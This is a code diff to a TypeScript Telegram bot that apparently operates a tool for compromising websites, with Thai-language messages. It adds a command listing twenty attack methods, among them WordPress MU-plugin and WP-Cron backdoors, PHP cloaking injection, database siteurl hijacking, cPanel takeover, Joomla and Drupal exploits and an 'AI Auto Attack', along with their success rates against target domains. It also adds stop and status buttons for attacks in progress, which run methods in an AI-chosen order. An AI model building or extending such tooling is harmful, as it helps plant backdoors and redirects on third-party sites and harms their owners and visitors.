@@ -2441,6 +2441,101 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
       return;
     }
     
+    if (msg.text === "/methods") {
+      // Show all 20 attack methods with success rates
+      const { getMethodSuccessRates } = await import("./db");
+      const rates = await getMethodSuccessRates();
+      
+      // All available methods (same as full_chain ALL_METHODS)
+      const ALL_METHOD_LIST = [
+        { id: "pipeline", name: "Unified Attack Pipeline", icon: "💥", phase: "exploit" },
+        { id: "cloaking", name: "PHP Cloaking Injection", icon: "💊", phase: "inject" },
+        { id: "mu_plugins", name: "MU-Plugins Backdoor", icon: "💀", phase: "inject" },
+        { id: "db_siteurl", name: "DB siteurl/home Hijack", icon: "🗄️", phase: "hijack" },
+        { id: "gtm_inject", name: "GTM Redirect Inject", icon: "🏷️", phase: "inject" },
+        { id: "auto_prepend", name: "auto_prepend .user.ini", icon: "⚙️", phase: "inject" },
+        { id: "hijack", name: "Hijack Redirect (6 วิธี)", icon: "🔓", phase: "hijack" },
+        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", icon: "🚀", phase: "exploit" },
+        { id: "redirect", name: "Redirect Takeover", icon: "🎯", phase: "hijack" },
+        { id: "wp_cron", name: "WP-Cron Backdoor", icon: "⏰", phase: "inject" },
+        { id: "widget_inject", name: "Widget/Sidebar Inject", icon: "🧱", phase: "inject" },
+        { id: "wpcode_abuse", name: "WPCode Plugin Abuse", icon: "📝", phase: "inject" },
+        { id: "service_worker", name: "Service Worker Hijack", icon: "🛡️", phase: "inject" },
+        { id: "joomla", name: "Joomla Exploits", icon: "🔴", phase: "exploit" },
+        { id: "drupal", name: "Drupal Exploits", icon: "🔵", phase: "exploit" },
+        { id: "cpanel_full", name: "cPanel Full Control", icon: "🖥️", phase: "hijack" },
+        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", icon: "🪟", phase: "exploit" },
+        { id: "open_redirect", name: "Open Redirect Chain", icon: "🔗", phase: "hijack" },
+        { id: "laravel_inject", name: "Laravel Redirect Inject", icon: "🟥", phase: "exploit" },
+        { id: "agentic_auto", name: "AI Auto Attack", icon: "🤖", phase: "exploit" },
+      ];
+      
+      // Build stats map
+      const statsMap = new Map(rates.map(r => [r.method, r]));
+      
+      // Also check for method names that might be stored differently
+      let totalAttempts = 0;
+      let totalSuccess = 0;
+      for (const r of rates) {
+        totalAttempts += r.totalAttempts;
+        totalSuccess += r.totalSuccess;
+      }
+      
+      const lines: string[] = [];
+      lines.push("⚔️ Attack Methods (20 วิธี)");
+      lines.push("═══════════════════════════");
+      lines.push("");
+      
+      // Group by phase
+      const phases = [
+        { key: "exploit", label: "💥 EXPLOIT", desc: "โจมตีช่องโหว่โดยตรง" },
+        { key: "inject", label: "💉 INJECT", desc: "ฝังโค้ดเข้าระบบ" },
+        { key: "hijack", label: "🔓 HIJACK", desc: "ยึดการควบคุม" },
+      ];
+      
+      for (const phase of phases) {
+        const methods = ALL_METHOD_LIST.filter(m => m.phase === phase.key);
+        lines.push(`${phase.label} — ${phase.desc}`);
+        lines.push("─────────────────────");
+        
+        for (const m of methods) {
+          const stat = statsMap.get(m.id);
+          if (stat && stat.totalAttempts > 0) {
+            const bar = stat.successRate >= 50 ? "🟢" : stat.successRate >= 20 ? "🟡" : "🔴";
+            const avgSec = Math.round(stat.avgDurationMs / 1000);
+            lines.push(`${m.icon} ${m.name}`);
+            lines.push(`   ${bar} ${stat.successRate}% (${stat.totalSuccess}/${stat.totalAttempts}) | ~${avgSec}s`);
+          } else {
+            lines.push(`${m.icon} ${m.name}`);
+            lines.push(`   ⚪ ยังไม่เคยใช้`);
+          }
+        }
+        lines.push("");
+      }
+      
+      // Summary
+      const overallRate = totalAttempts > 0 ? Math.round((totalSuccess / totalAttempts) * 100) : 0;
+      lines.push("📊 สรุปรวม");
+      lines.push("─────────────────────");
+      lines.push(`รวมทั้งหมด: ${totalAttempts} ครั้ง`);
+      lines.push(`สำเร็จ: ${totalSuccess} ครั้ง (${overallRate}%)`);
+      lines.push(`วิธีที่ใช้แล้ว: ${rates.length}/${ALL_METHOD_LIST.length}`);
+      
+      // Top 3 methods
+      if (rates.length > 0) {
+        lines.push("");
+        lines.push("🏆 Top 3 Success Rate:");
+        const sorted = [...rates].filter(r => r.totalAttempts >= 3).sort((a, b) => b.successRate - a.successRate);
+        for (const r of sorted.slice(0, 3)) {
+          const m = ALL_METHOD_LIST.find(x => x.id === r.method);
+          lines.push(`  ${m?.icon || "•"} ${m?.name || r.method}: ${r.successRate}% (${r.totalSuccess}/${r.totalAttempts})`);
+        }
+      }
+      
+      await sendTelegramReply(config, msg.chat.id, lines.join("\n"), msg.message_id);
+      return;
+    }
+    
     // Process with AI (text messages only at this point — documents handled above)
     if (!msg.text) return;
     console.log(`[TelegramAI] ${msg.from.first_name}: "${msg.text.substring(0, 80)}"`);
@@ -3207,34 +3302,40 @@ async function sendAlternativeAttackSuggestions(
 //  REAL-TIME PROGRESS — edit message in-place during attack
 // ═══════════════════════════════════════════════════════
 
-async function editTelegramMessage(config: TelegramConfig, chatId: number, messageId: number, text: string): Promise<boolean> {
+async function editTelegramMessage(config: TelegramConfig, chatId: number, messageId: number, text: string, replyMarkup?: any): Promise<boolean> {
   try {
     const url = `https://api.telegram.org/bot${config.botToken}/editMessageText`;
     
     // Attempt 1: With Markdown
+    const payload1: any = {
+      chat_id: chatId,
+      message_id: messageId,
+      text,
+      parse_mode: "Markdown",
+    };
+    if (replyMarkup) payload1.reply_markup = replyMarkup;
+    
     const { response } = await telegramFetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: messageId,
-        text,
-        parse_mode: "Markdown",
-      }),
+      body: JSON.stringify(payload1),
       signal: AbortSignal.timeout(10000),
     }, { timeout: 10000 });
     const result = await response.json() as any;
     if (result.ok) return true;
     
     // Attempt 2: Without Markdown (plain text fallback)
+    const payload2: any = {
+      chat_id: chatId,
+      message_id: messageId,
+      text,
+    };
+    if (replyMarkup) payload2.reply_markup = replyMarkup;
+    
     const { response: plainResp } = await telegramFetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: messageId,
-        text,
-      }),
+      body: JSON.stringify(payload2),
       signal: AbortSignal.timeout(10000),
     }, { timeout: 10000 });
     const plainResult = await plainResp.json() as any;
@@ -3244,14 +3345,16 @@ async function editTelegramMessage(config: TelegramConfig, chatId: number, messa
   }
 }
 
-async function sendAndGetMessageId(config: TelegramConfig, chatId: number, text: string): Promise<number | null> {
+async function sendAndGetMessageId(config: TelegramConfig, chatId: number, text: string, replyMarkup?: any): Promise<number | null> {
   try {
     const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    const payload: any = { chat_id: chatId, text };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
     // Try with Markdown first, then plain text fallback
     const { response } = await telegramFetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text }),
+      body: JSON.stringify(payload),
       signal: AbortSignal.timeout(10000),
     }, { timeout: 10000 });
     const result = await response.json() as any;
@@ -3383,8 +3486,15 @@ function translatePipelineEvent(phase: string, detail: string): string | null {
 async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
   console.log(`[TelegramAI] executeAttackWithProgress called: domain=${domain}, method=${method}`);
   const eta = getMethodEta(method);
+  const attackId = `${domain}:${method}:${Date.now()}`;
+  const stopKeyboard = {
+    inline_keyboard: [[
+      { text: "⏹ หยุดโจมตี", callback_data: `stop_attack:${domain}` },
+      { text: "📊 สถานะ", callback_data: `attack_status:${domain}` },
+    ]],
+  };
   const progressMsgId = await sendAndGetMessageId(config, chatId,
-    `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\nETA: ${eta.label}\n\n\u23F3 กำลังเตรียมพร้อม...`);
+    `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\nETA: ${eta.label}\n\n\u23F3 กำลังเตรียมพร้อม...`, stopKeyboard);
   
   if (!progressMsgId) {
     await sendTelegramReply(config, chatId, "\u274C ส่งข้อความ progress ไม่ได้");
@@ -3919,6 +4029,12 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       // Execute methods in AI-determined order
       for (let mi = 0; mi < methodOrder.length && !fullChainSuccess; mi++) {
+        // Check if user pressed stop button
+        if (attackEntry.abortController.signal.aborted) {
+          await narrator.addAnalysis(`⏹ ผู้ใช้กดหยุดโจมตี — หยุดที่วิธีที่ ${mi + 1}/${methodOrder.length}`);
+          break;
+        }
+        
         const methodId = methodOrder[mi];
         const methodDef = ALL_METHODS.find(m => m.id === methodId)!;
         await narrator.startPhase(methodDef.phase, `${methodDef.icon} วิธีที่ ${mi + 1}: ${methodDef.name}`);
@@ -5820,6 +5936,60 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
       default: {
         // Handle dynamic callback data patterns
         const data = cbq.data || "";
+        
+        // stop_attack:<domain> — user pressed stop button during attack
+        if (data.startsWith("stop_attack:")) {
+          const targetDomain = data.replace("stop_attack:", "");
+          const running = getRunningAttacks();
+          const matchingAttacks = running.filter(a => a.domain === targetDomain);
+          
+          if (matchingAttacks.length > 0) {
+            for (const atk of matchingAttacks) {
+              atk.abortController.abort();
+              atk.lastUpdate = "STOPPED BY USER";
+            }
+            
+            await sendTelegramReply(config, chatId,
+              `⏹ หยุดโจมตี ${targetDomain} แล้ว!\n\n` +
+              `🛑 ยกเลิก ${matchingAttacks.length} การโจมตีที่กำลังทำงาน\n` +
+              `📋 Method: ${matchingAttacks.map(a => a.method).join(", ")}\n\n` +
+              `💡 พิมพ์ /status เพื่อเช็คสถานะ หรือเริ่มโจมตีใหม่ได้เลย`
+            );
+          } else {
+            await sendTelegramReply(config, chatId,
+              `⚠️ ไม่พบการโจมตี ${targetDomain} ที่กำลังทำงานอยู่\n\n` +
+              `อาจเสร็จสิ้นไปแล้ว — พิมพ์ /status เพื่อเช็ค`
+            );
+          }
+          return;
+        }
+        
+        // attack_status:<domain> — show real-time status of running attack
+        if (data.startsWith("attack_status:")) {
+          const targetDomain = data.replace("attack_status:", "");
+          const running = getRunningAttacks();
+          const matchingAttacks = running.filter(a => a.domain === targetDomain);
+          
+          if (matchingAttacks.length > 0) {
+            const lines: string[] = [];
+            lines.push(`📊 สถานะโจมตี: ${targetDomain}`);
+            lines.push("─────────────────────");
+            for (const atk of matchingAttacks) {
+              const elapsed = formatElapsed(Date.now() - atk.startedAt);
+              const atkEta = getMethodEta(atk.method);
+              const etaRemaining = formatEtaRemaining(atk.startedAt, atkEta);
+              lines.push(`⚔️ ${atk.method}`);
+              lines.push(`  ⏱ ${elapsed} | ETA: ${etaRemaining}`);
+              lines.push(`  📝 ${atk.lastUpdate}`);
+            }
+            await sendTelegramReply(config, chatId, lines.join("\n"));
+          } else {
+            await sendTelegramReply(config, chatId,
+              `⚠️ ไม่พบการโจมตี ${targetDomain} ที่กำลังทำงาน`
+            );
+          }
+          return;
+        }
         
         // atk_select:<domain> — user selected a target, show method keyboard
         if (data.startsWith("atk_select:")) {
